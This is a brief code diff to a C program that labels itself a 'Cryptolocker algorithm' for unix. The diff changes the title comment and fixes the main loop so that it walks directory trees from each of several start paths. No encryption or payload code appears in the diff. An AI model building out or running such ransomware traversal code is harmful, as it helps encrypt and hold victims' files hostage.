@@ -1,5 +1,5 @@
 /*
- * Title  : Cryptolocker algorithm
+ * Title  : Cryptolocker algorithm (for unix)
  * Date   : 09 February 2023
  * Author : https://github.com/ch4rp/
  */
@@ -26,7 +26,7 @@ int main(void)
 	unsigned int i;
 
 	for (i = 0; i < size_paths; ++i)
-		tree(startpath);
+		tree(startpaths[i]);
 
 	return 0;
 }
